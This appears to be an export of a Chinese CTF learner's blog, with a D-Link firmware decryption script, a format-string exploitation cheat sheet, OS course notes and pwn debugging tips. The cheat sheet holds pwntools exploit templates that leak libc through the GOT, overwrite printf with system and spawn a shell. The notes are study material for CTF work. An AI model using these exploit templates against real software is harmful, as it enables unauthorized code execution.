</span><br><span class="line">  <span class="number">0x49</span>, <span class="number">0x4B</span>, <span class="number">0x51</span>, <span class="number">0x67</span>, <span class="number">0x6E</span>, <span class="number">0x4F</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, <span class="number">0x75</span>, <span class="number">0x46</span>, </span><br><span class="line">  <span class="number">0x34</span>, <span class="number">0x62</span>, <span class="number">0x7A</span>, <span class="number">0x34</span>, <span class="number">0x66</span>, <span class="number">0x72</span>, <span class="number">0x47</span>, <span class="number">0x50</span>, <span class="number">0x64</span>, <span class="number">0x4E</span>, </span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x4C</span>, <span class="number">0x75</span>, <span class="number">0x4F</span>, <span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec_val_by_sig</span>(<span class="params">dec_sig_val,dec_len,sig</span>): <span class="comment"># encrypt 函数 python表示</span></span><br><span class="line">    sig_len = <span class="built_in">len</span>(sig)</span><br><span class="line">    loop_sig_idx = <span class="number">0</span></span><br><span class="line">    loop_dec_idx = <span class="number">1</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        cur_sig = sig[loop_sig_idx]</span><br><span class="line">        loop_sig_idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(idx&gt;=dec_len):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(loop_sig_idx&gt;=sig_len):</span><br><span class="line">            loop_sig_idx=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">        dec_sig_val[idx] = loop_dec_idx ^ dec_sig_val[idx] ^ <span class="built_in">ord</span>(cur_sig)</span><br><span class="line">        loop_dec_idx+=<span class="number">1</span></span><br><span class="line">        idx+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> loop_dec_idx &gt;= <span class="number">252</span>:</span><br><span class="line">            loop_dec_idx = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">aes_key = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">    aes_key.append(______progs_board_fw_sign_data[i+<span class="number">32</span>])</span><br><span class="line"></span><br><span class="line">iv = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>):</span><br><span class="line">    iv.append(______progs_board_fw_sign_data[i+<span class="number">96</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line">dec_val_by_sig(iv,<span class="number">16</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line">dec_val_by_sig(aes_key,<span class="number">32</span>,<span class="string">&#x27;wrgac25_dlink.2013gui_dir850l&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;iv before dec: &#x27;</span>,iv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;aes_key before dec: &#x27;</span>,aes_key)</span><br><span class="line"></span><br><span class="line">aes_decrypt_file(aes_key,iv,<span class="string">&#x27;/mnt/e/EdgeDownload/IOT/DIR850LB1_FW220WWb03.bin&#x27;</span>,<span class="string">&#x27;out.bin&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>解密后即可解包</p>
<figure>
<img src="https://i0.imgs.ovh/2023/11/09/lJZRR.png" alt="lJZRR.png" />
<figcaption aria-hidden="true">lJZRR.png</figcaption>
</figure>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Mips</tag>
        <tag>Wifi</tag>
      </tags>
  </entry>
  <entry>
    <title>Manual</title>
    <url>/2024/02/17/Manual/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
Manual is quite significant
</blockquote>
<span id="more"></span>
<p><a href="www.man7.org">man7.org</a></p>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Format String Summary</title>
    <url>/2024/01/21/Pwn%20-%20Format%20String%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下格式化字符串漏洞，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="原理-工具">原理 &amp; 工具</h1>
<h2 id="原理">原理</h2>
<blockquote>
<p>本质是利用 printf(string) 任意地址读写</p>
</blockquote>
<blockquote>
<p>记录一下常用的格式</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        标准作用       ||           常用方式</span><br><span class="line">——————————————————————————————————————————————————————————————</span><br><span class="line">%p     :     输出栈上的内容     |  (读) 找偏移\pie_base\canary</span><br><span class="line">%s     :   输出地址指向的内容   ||     (读) 泄露libc_base</span><br><span class="line">%hhn   :   修改地址指向的byte   |        (写) 任意地址写</span><br><span class="line">%hn/%n : 修改地址指向的2/4bytes |        (写) 任意地址写</span><br></pre></td></tr></table></figure>
<h2 id="工具-pwntools---fmtstr_payload">工具: Pwntools -
fmtstr_payload</h2>
<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
class fmtstr</a></p>
<blockquote>
<p>源码见上述链接或文章末尾的 Appendix</p>
</blockquote>
<p>fmtstr是一个类，我们只需要用其中的 fmtstr_payload 来构造我们的
payload 即可。现在版本的 pwntools 已经支持 64 位的 格式化字符串 payload
生成了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default: numbwritten=0 , write_size=<span class="string">&#x27;byte&#x27;</span></span></span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example:</span></span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="ctf-中的题型">CTF 中的题型</h1>
<h2 id="栈上">栈上</h2>
<h3 id="位">32位</h3>
<blockquote>
<p>最基础的题目，fmtstr_payload一把梭，模板如下</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload    = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">3</span>:])</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="位-1">64位</h3>
<blockquote>
<p>由于许多地址只有六字节，所以为了对齐八字节，我们需要用''来填充，但''会截断
printf 的输出，所以我们需要让 printf 先输出格式化字符.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认偏移量</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 offset=6，泄露libc基址</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload  = <span class="string">b&#x27;%7$sAAAA&#x27;</span> + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 确认libc</span></span><br><span class="line">printf_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收程序信息，向程序发送payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提权</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="非栈上bss段">非栈上(BSS段)</h2>
<p>2023moeCTF的第三道fmt就是这种题目，exp在本地，后续有时间更新</p>
<h2 id="特殊情况">特殊情况</h2>
<h3 id="一次printf就返回">一次printf就返回</h3>
<blockquote>
<p>printf 的要求十分严格，通常有两种做法</p>
</blockquote>
<ol type="1">
<li>要求：栈上有一串具有三个函数的rbp的链，NO PIE，libc已知
<ol type="1">
<li>做法：在栈上布满one_gadget，然后找到一条带有3个rbp的链，修改中间一个
node 的低字节，让其指向的rbp变低，进而在返回时可以直接返回og</li>
<li>本质: 利用 ret(实质是 pop rip) 时返回栈帧上的一条指令</li>
</ol></li>
<li><a
href="https://www.freebuf.com/articles/system/385029.html">打fini_array（未学习）</a></li>
</ol>
<h3 id="full-relro">FULL RELRO</h3>
<blockquote>
<p>FULL RELRO 意味着我们不能修改 got 表，所以我们需要修改返回地址</p>
</blockquote>
<p>要求：可以 printf
的次数较多(至少多于四次)，可以让我们将返回地址修改为 one_gadget</p>
<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
<blockquote>
<p>假设调用链为 main-&gt;func-&gt;printf，而在 func 中存放着 fmt，则栈中
fmt
上方不远处一定有调用printf语句的下一句(PC+4)，即返回地址，和canary</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">假设偏移量为6，栈构造如下</span><br><span class="line">---printf栈帧---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printf栈帧---</span><br><span class="line"></span><br><span class="line">----func栈帧----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----func栈帧----</span><br><span class="line"></span><br><span class="line">----main栈帧----</span><br><span class="line">...............</span><br><span class="line">----main栈帧----</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">泄露 pie_base &amp; canary</span></span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
<h1 id="appendix">Appendix</h1>
<h2
id="pwnlib.fmtstr.fmtstr_payload源码">pwnlib.fmtstr.fmtstr_payload源码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span> (</span><br><span class="line">        offset,              <span class="comment"># 字符串在栈上的偏移量</span></span><br><span class="line">        writes,              <span class="comment"># &#123;target_addr:int_to_write&#125; 要写入的数字</span></span><br><span class="line">        numbwritten=<span class="number">0</span>,       <span class="comment"># printf 已经打印的字符数量</span></span><br><span class="line">        write_size=<span class="string">&#x27;byte&#x27;</span>,   <span class="comment"># 写入字节的大小</span></span><br><span class="line">        write_size_max=<span class="string">&#x27;long&#x27;</span>, <span class="comment"># </span></span><br><span class="line">        overflows=<span class="number">16</span>,        <span class="comment"># </span></span><br><span class="line">        strategy=<span class="string">&quot;small&quot;</span>,    <span class="comment"># 默认small，如果追求速度可以用fast模式</span></span><br><span class="line">        badbytes=<span class="built_in">frozenset</span>(),  <span class="comment"># </span></span><br><span class="line">        offset_bytes=<span class="number">0</span>,      <span class="comment"># </span></span><br><span class="line">        no_dollars=<span class="literal">False</span>     <span class="comment"># 是否有 $ 符号,比如不用 &#x27;%996$n&#x27;</span></span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data_offset = (offset_bytes + <span class="built_in">len</span>(fmt)) // context.<span class="built_in">bytes</span></span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-<span class="built_in">len</span>(fmt)-offset_bytes) % context.<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fmt) + offset_bytes == data_offset * context.<span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;this is a bug ... format string building did not converge&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fmt + data</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Heap</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>OS - jyyos_theory</title>
    <url>/2024/02/14/OS%20-%20jyyos_theory/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
Notes &amp; Example code debug
</blockquote>
<span id="more"></span>
<blockquote>
<p>For academic integrity, I decide to hide my
<code>OS - jyyos_LabCode</code> and write this one.</p>
</blockquote>
<h1 id="manual">Manual</h1>
<p><a href="https://github.com/ibraheemdev/modern-unix">Modern
Unix</a></p>
<h1 id="p1-绪论1">[P1] 绪论1</h1>
<h2 id="课堂笔记">课堂笔记</h2>
<blockquote>
<p>我们为什么要学操作系统？</p>
</blockquote>
<p>为了更好的编写程序，更好的解决问题</p>
<blockquote>
<p>什么是操作系统？</p>
</blockquote>
<p>硬件与软件的中间层</p>
<p>对硬件：管理资源</p>
<p>对软件：提供API</p>
<div class="note info">
            <p>大学的去内卷化失败了，但是这个世界需要英雄，去做那个全世界只有你相信的事</p>
          </div>
<div class="note info">
            <p>在 AI 时代，比起看书学习，学会问问题可能是更佳的选择</p>
          </div>
<blockquote>
<p>我们怎样学习操作系统？</p>
</blockquote>
<p>读源码</p>
<p>相信机器永远是对的</p>
<p>不要尝试“架空学习”，不会就回头补基础</p>
<blockquote>
<p>PS: nju
数字电路的内容等价于我们学校的数电+计组verilog部分，他们还多一门
系统原理+PA，学这门课的时候我已经落后他们一年的时间了，不要急，遇到问题就去RTFM
/ STFW，不要靠 gpt 急功近利，理解问题是怎么发生的</p>
</blockquote>
<p>多问“能不能再做点什么”</p>
<h2 id="assignment-after-video">Assignment After Video</h2>
<h3 id="延伸阅读">延伸阅读</h3>
<ol type="1">
<li><p>代码移植性：</p></li>
<li><p>使用<code>-Wall -Werror</code>来检查规范性</p></li>
<li><p>兼容大小端和不同架构，注意避免指针强制转换</p></li>
<li><p>避免硬编码路径</p></li>
</ol>
<h3 id="code-learning">Code Learning</h3>
<h4 id="demo模拟数字系统">Demo：模拟数字系统</h4>
<blockquote>
<p>logisim.c</p>
</blockquote>
<ul>
<li><p>Tricks：</p>
<ol type="1">
<li><p>使用 <code>#define PRINT(X) printf("x = %d",X)</code>
等宏定义来简化代码</p></li>
<li><p>使用 typedef struct {} xx; 来封装</p></li>
<li><p><code>fflush(stdout)</code> 是刷新缓冲区，立即打印到终端</p></li>
</ol></li>
</ul>
<blockquote>
<p>seven-seg.py</p>
</blockquote>
<ul>
<li><p>Tricks:</p>
<ol type="1">
<li><p>ANSI Escape Code</p></li>
<li><p><code>import fileinput</code> 来在终端用管道向 py
文件输入</p></li>
<li><p><code>exec(line)</code> 将 line 作为一条 python
语句执行，并将结果存入全局变量，后续可以通过 <code>globals()[xx]</code>
来访问</p></li>
</ol></li>
</ul>
<blockquote>
<p>Makefile</p>
</blockquote>
<ol type="1">
<li>CFLAGS</li>
</ol>
<ul>
<li><p>-ggdb: -g代表生成调试信息
-ggdb的gdb则是生成特定于GDB的调试信息</p></li>
<li><p>-Wall all warnings 的缩写，启用编译器的所有警告信息</p></li>
</ul>
<h1 id="p2-绪论2">[P2] 绪论2</h1>
<h2 id="感慨">感慨</h2>
<p>这节课真的听的巨爽，在23版的课程里，jyy老师对各种操作讲的特别细，很多小细节都讲到了，对我这种没有前置
PA 或者其他知识的学生特别友好。</p>
<p>这节课的主要目的是让我们相信，一台电脑上的所有软件都与那个“强制走完编译过程”的最小
hello world 程序没有区别</p>
<p>通过这节课我对 unix philosophy 有了更深一步的理解</p>
<blockquote>
<p>听课还是跟着老师的思维走，不需要提前总结或者消化</p>
</blockquote>
<p>除此之外，非递归的汉诺塔让我对C语言的Program
Semantic有了一定的了解，我笼统地了解了一下解释器的原理</p>
<p>通过helloworld我还复习了一遍从代码到程序的全过程。</p>
<p>jyy老师说后面会真正地讲游戏外挂，期待一手。</p>
<h2 id="take-away-message">take-away message</h2>
<blockquote>
<p>什么是软件</p>
</blockquote>
<p>软件是操作系统的服务对象，本质上就是一串字符序列</p>
<blockquote>
<p>如何在操作系统上构造最小/一般/图形界面应用程序？</p>
</blockquote>
<p><strong>最小</strong>: 强制走一遍预处理编译汇编链接的全过程，其中</p>
<p>.c -&gt; .i 预处理，这一步主要是打开头文件、去除注释、展开宏等操作
(由cc完成)</p>
<p>.i -&gt; .s 编译，这一步的主要操作就是将预处理后的代码翻译成汇编代码
(也由cc完成)</p>
<p>以上两步都由 cc 完成，所以也可以看作一步</p>
<p>.s -&gt; .o
汇编，这一步汇编器将汇编语言翻译成机器语言，生成目标文件，其中包含与特定硬件平台相关的可执行指令，这一步包含语法分析、符号解析、生成目标代码、重定位，最终生成目标文件
(由 as 完成)</p>
<p>.o -&gt; .out 链接</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -E test.c <span class="comment"># 输出 test.i</span></span><br><span class="line">gcc -c test.c <span class="comment"># 生成 test.o</span></span><br><span class="line">ld test.o -e main <span class="comment"># 以 main 作为程序入口点</span></span><br></pre></td></tr></table></figure>
<p><strong>图形</strong>: 向操作系统发起请求，访问屏幕进行读写</p>
<blockquote>
<p>什么是编译器?编译器把一段程序翻译成什么样的指令序列才算 “正确”？</p>
</blockquote>
<p>只要程序执行时，<strong>从外看</strong>运行过程和结果都与指令预期一致，就算正确</p>
<h2 id="代码阅读">代码阅读</h2>
<h3 id="非递归汉诺塔实现">非递归汉诺塔实现</h3>
<p>这个非递归实现，其实主要逻辑还是递归的，只是把创建/删除栈帧的操作让我们自己用C代码实现而不是交给操作系统实现。</p>
<p>如果我们用一个全局变量表示
rax，我们就可以将其作为返回值表示；同理我们还可以用结构体数组来表示栈帧，用全局变量表示
rsp</p>
<p>这个非递归代码与正常汇编代码执行比起来，比较大的一个不同点就是它在栈帧内用了一个变量
pc 来表示这个栈帧接下来应该执行哪一步，归根结底-</p>
]]></content>
      <categories>
        <category>CS Basics</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Architecture other than LinuxC</title>
    <url>/2024/02/09/Pwn%20-%20Architecture%20other%20than%20LinuxC/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下异架构的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ol type="1">
<li><a href="#1-different-language">Different Language</a>
<ul>
<li><a href="#1-1-python">python</a></li>
</ul></li>
<li><a href="#2-different-architecture">Different Architecture</a>
<ul>
<li><a href="#2-1-arm">ARM</a></li>
</ul></li>
</ol>
<h1 id="different-language">[1] Different Language</h1>
<h2 id="python">[1-1] python</h2>
<h3 id="python-链接-动态链接库">[1-1-1] python 链接 动态链接库</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在 main.py 中添加:</span></span><br><span class="line">sys.path.append(<span class="string">&quot;/absolute/path/to/packagename.cpython-37m-x86_64-linux-gnu.so&quot;</span>)</span><br><span class="line"><span class="comment"># app.cpython-37m-x86_64-linux-gnu.so 中的 37m 指的是 python3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packagename</span><br></pre></td></tr></table></figure>
<h3 id="用-pwntools-调试">[1-1-2] 用 pwntools 调试</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;main.py&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h1 id="different-architecture">[2] Different Architecture</h1>
<h2 id="arm">[2-1] ARM</h2>
<p><a href="https://www.cnblogs.com/yidianhan/p/13060466.html">Manual:
ARM/mips系统调用号</a></p>
<h3 id="用-pwntools-调试-1">[2-1-1] 用 pwntools 调试</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后再开一个tmux</span></span><br><span class="line"><span class="comment"># 用 gdb-multiarch ./pwn</span></span><br><span class="line"><span class="comment"># 在 gdb 中输入 target remote:1234</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Heap Exploit Summary</title>
    <url>/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
总结一下 Heap 的相关内容，便于后续调用
</blockquote>
<span id="more"></span>
<p><a href="https://github.com/iromise/glibc/tree/master/malloc">Github:
ptmalloc 源码(只有 malloc 部分)</a></p>
<p><a href="https://www.jianshu.com/p/1a966b62b3d4">source code
compilation &amp;&amp; all libc debs</a></p>
<h1 id="目录">[0] 目录</h1>
<ol type="1">
<li><a href="#1-patchelf的使用方式">Patchelf的使用方式</a></li>
<li><a href="#2-详解-申请与释放-chunk未完成">详解 '申请与释放
chunk'</a></li>
<li><a href="#3-chunk-extend-and-overlapping">chunk Extend and
Overlapping</a></li>
<li><a href="#4-use-after-free">Use After Free</a></li>
<li><a href="#5-double-free">Double Free</a></li>
<li><a href="#6-unlink">Unlink</a></li>
<li><a href="#7-series-of-bin">Series of Bin</a>
<ul>
<li><a href="#7-1-tcachebin">7-1 Tcachebin</a></li>
<li><a href="#7-2-fastbin">7-2 Fastbin</a></li>
<li><a href="#7-3-unsortedbin">7-3 Unsortedbin</a></li>
<li><a href="#7-4-largebin-attack">7-4 Largebin Attack</a></li>
</ul></li>
<li><a href="#8-series-of-house">Series of House</a>
<ul>
<li><a href="#8-1-house-of-orange">8-1 House of Orange</a></li>
<li><a href="#8-2-house-of-force-hof">8-2 House of Force</a></li>
<li><a href="#8-3-house-of-botcake">8-3 House of botcake</a></li>
<li><a href="#8-4-house-of-banana">8-4 House of banana</a></li>
<li><a href="#8-5-house-of-pig">8-5 House of pig</a></li>
</ul></li>
</ol>
<h1 id="patchelf的使用方式">[1] Patchelf的使用方式</h1>
<blockquote>
<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理
heap，因此我们需要将本地的 elf 文件的链接部分 patch
一下，使其与远程链接的 libc 文件保持一致。</p>
</blockquote>
<h2 id="确认libc">[1-1] 确认libc</h2>
<blockquote>
<p>有时题目只给一个 libc.so.6，此时 patchelf 后程序会因为缺少 ld
文件而无法正常运行，因此我们需要通过这个 libc.so.6 来确认程序使用的 libc
版本，然后自己下载对应 libc 包并 patch</p>
</blockquote>
